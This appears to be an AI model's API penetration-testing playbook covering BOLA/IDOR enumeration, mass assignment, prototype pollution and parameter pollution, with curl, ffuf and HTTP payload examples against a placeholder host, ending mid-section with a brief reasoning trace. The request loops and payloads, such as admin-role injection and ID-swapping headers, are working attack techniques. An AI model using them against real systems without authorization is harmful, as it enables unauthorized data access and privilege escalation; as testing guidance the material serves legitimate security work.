# glm-5.3 — api-sec

# API Security Testing Playbook

## 1. BOLA / IDOR Hunting

### Sequential IDs
Enumerate around your own authorized ID. If your object is `/api/v2/orders/15042`, walk the neighborhood:

```bash
AUTH="Authorization: Bearer eyJhbGciOi..."

# Single-object probe
for id in 15039 15040 15041 15043 15044 15045; do
  echo -n "order $id -> "
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
    -H "$AUTH" "https://target.api/api/v2/orders/$id"
done
```

**Tells:** `200` on foreign IDs = BOLA. `403` vs `404` distinction matters — `404` may mean the object doesn't exist OR IDOR is masked; `403` means existence is leaked (information disclosure via authorization boundary).

### UUID endpoints
UUIDs aren't access control. Hunt them through leaks, not guessing:

- **Response leakage:** other objects' responses often embed related UUIDs (order → user_id, invoice → order_id). Harvest with jq:

```bash
curl -s -H "$AUTH" "https://target.api/api/v2/orders/15042" | \
  jq -r '.. | strings | select(test("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"))' | \
  sort -u > uuids.txt

# Test each harvested UUID against every object endpoint you know
while read u; do
  for ep in users invoices shipments; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" "https://target.api/api/v2/$ep/$u")
    [ "$code" = "200" ] && echo "HIT: /$ep/$u"
  done
done < uuids.txt
```

- **Leak sources:** export/PDF generation endpoints, webhook payloads, email preview APIs, `?expand=` parameters, URL-sharing features (public share links often use a predictable transform of the internal UUID — base64-decode them).
- **UUIDv1** contains a MAC-derived node and timestamp: `uuid1` timestamps can be recovered and adjacent values brute-forced. Check version nibble: `xxxxxxxx-xxxx-1xxx` = v1. Tools: `unudp` / `uuid-penerator` for v1 prediction.

### Nested object IDs
The classic miss: parent object is authorized, child object isn't checked against the *grandparent*.

```
GET /api/v2/workspaces/{MY-WS}/members/{OTHER-WS-USER}     ← child ID not validated against parent
GET /api/v2/orgs/{MY-ORG}/projects/{FOREIGN-PROJECT-ID}/secrets
GET /api/v2/teams/{MY-TEAM}/documents/{FOREIGN-DOC-UUID}
DELETE /api/v2/workspaces/{MY-WS}/invitations/{FOREIGN-INVITE-ID}
```

Automate: capture every ID you see in a privileged session, then substitute into every nested path under your *own* parent:

```bash
# ffuf against nested path with harvested foreign IDs
ffuf -u "https://target.api/api/v2/workspaces/MYWS/documents/FUZZ" \
     -H "$AUTH" -w foreign_doc_ids.txt -mc 200 \
     -X GET -o nested_bola.json
```

Also test **method-level** BOLA on nested routes — `GET /parent/mine/child/{foreign}` may 404 but `PATCH`/`DELETE` on the same path may still succeed (authz applied only to read path).

### /me vs /{id} parameter swapping
The `/me` endpoint reveals the authorized object shape; the `/{id}` route may skip ownership checks entirely. Correlate:

```bash
# 1. Baseline: what does /me return?
curl -s -H "$AUTH" "https://target.api/api/v2/account/me" | jq .

# 2. Swap: does the /{id} route return the same fields for a foreign ID?
curl -s -H "$AUTH" "https://target.api/api/v2/account/99887" | jq .

# 3. Reverse: does /me accept an injected ID anywhere?
curl -s -H "$AUTH" "https://target.api/api/v2/account/me?user_id=99887"
curl -s -H "$AUTH" -H "X-User-Id: 99887" "https://target.api/api/v2/account/me"
curl -s -H "$AUTH" -H "X-Original-URL: /api/v2/account/99887" "https://target.api/api/v2/account/me"
```

Pattern is broader than `/me` — it's any endpoint pair where one route derives the ID from the token and another takes it as input. Also swap **in the body**:

```json
POST /api/v2/account/me/preferences
{"user_id": 99887, "theme": "dark"}
```

If the response echoes user 99887's state, the handler trusts body over token.

### Batch endpoints
Batch APIs frequently authorize the *request*, not each *item*:

```http
POST /api/v2/orders/batch-get
Content-Type: application/json

{"ids": [15042, 15043, 15044, 15045, 15046]}
```

Also common forms:

```http
POST /api/v2/users/batch HTTP/1.1
{"ids": "1001,1002,1003,1004"}
```

```json
{"operations": [
  {"method": "GET", "path": "/users/1001"},
  {"method": "GET", "path": "/users/1002"},
  {"method": "GET", "path": "/users/9999"}
]}
```

Test: (a) mixed owned/foreign IDs in one batch, (b) all-foreign batch, (c) batch of 1 with a foreign ID (some implementations only enforce authz when `len(ids) > 1`).

## 2. Mass Assignment

Map the object model from every response you legitimately receive, then inject writable fields into create/update endpoints:

```bash
# Baseline object — note all fields, especially privileged ones
curl -s -H "$AUTH" "https://target.api/api/v2/users/me" | jq 'keys'
# ["id","email","role","is_admin","quota","status","org_id","created_at"]
```

Inject:

```http
POST /api/v2/users
Content-Type: application/json

{"email":"attacker@x.com","password":"x","role":"admin","is_admin":true,"quota":999999}
```

```http
PATCH /api/v2/users/me
{"email":"me@x.com","status":"active","role":"superuser"}
```

High-value fields to try: `role`, `roles`, `is_admin`, `is_staff`, `admin`, `permissions`, `user_type`, `account_type`, `tier`, `verified`, `is_verified`, `email_verified`, `balance`, `credits`, `quota`, `limit`, `status`, `org_id`, `tenant_id`, `owner_id`, `id` (ID-setting — can force collisions), `password` (on read endpoints to test hash leakage), `created_at`/`updated_at` (ORM poisoning), `__proto__` (JS-layer, see prototype pollution below).

Field name discovery:

```bash
# Deeper than top-level keys — walk the full tree
curl -s -H "$AUTH" "https://target.api/api/v2/users/me" | \
  jq -r '[paths(scalars) | join(".")] | .[]'
```

```bash
# Fuzz unknown field names — 200/201 with echo-back vs silently dropped
ffuf -u "https://target.api/api/v2/users" -X POST -H "$AUTH" \
     -H "Content-Type: application/json" \
     -w fields.txt -mc 200,201 \
     -d '{"email":"t@x.com","password":"x","FUZZ":"admin"}' \
     -fr '"FUZZ"'   # filter OUT responses that don't reflect the field
# Then re-GET the object and diff — reflection ≠ persistence
```

Prototype pollution in Node APIs (mass assignment reaching internal merge):

```json
PATCH /api/v2/profile
{"email":"a@b.c","__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"role":"admin"}}}
```

## 3. HTTP Parameter Pollution

Duplicate params — frameworks disagree on resolution (first, last, concat, array), which splits the auth path from the business path:

```bash
# Same param twice
curl -s -H "$AUTH" "https://target.api/api/v2/users/me/orders?user_id=MYID&user_id=FOREIGNID"
curl -s -H "$AUTH" "https://target.api/api/v2/users/me/orders?user_id=FOREIGNID&user_id=MYID"
```

Common split-brain: reverse proxy/WAF normalizes on the *first* value, framework binds the *last* — auth check sees MYID, query executes FOREIGNID.

```bash

---

## [reasoning trace]

Provide API security testing techniques with concrete request examples — standard pentest content, no identified target. Proceed.
